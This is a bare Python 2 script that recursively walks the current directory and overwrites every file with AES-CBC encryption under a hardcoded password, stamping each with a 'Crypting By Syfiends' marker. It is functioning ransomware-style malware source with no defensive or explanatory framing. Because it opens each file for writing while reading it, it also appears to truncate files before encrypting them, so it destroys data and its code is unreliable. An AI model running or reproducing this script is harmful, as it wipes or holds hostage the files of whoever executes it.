#!/usr/bin/python
import os
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
password = "1234567"

def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = ''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]

def encrypt(in_file, out_file, password, key_length=32):
    bs = AES.block_size
    salt = Random.new().read(bs - len('Salted__'))
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    out_file.write('Crypting By Syfiends')
    finished = False
    while not finished:
        chunk = in_file.read(1024 * bs)
        if len(chunk) == 0 or len(chunk) % bs != 0:
            padding_length = (bs - len(chunk) % bs) or bs
            chunk += padding_length * chr(padding_length)
            finished = True
        out_file.write(cipher.encrypt(chunk))

homedir = "."
path = os.path.join(homedir, "firstdir")

for path, subdirs, files in os.walk(homedir):
    for name in files:
        glofile = os.path.join(path, name)
        if os.path.isdir(glofile):
            print "This is dirrectory"
        else:
            with open(glofile, 'rb') as in_file, open(glofile, 'wb') as out_file:
                encrypt(in_file, out_file, password)
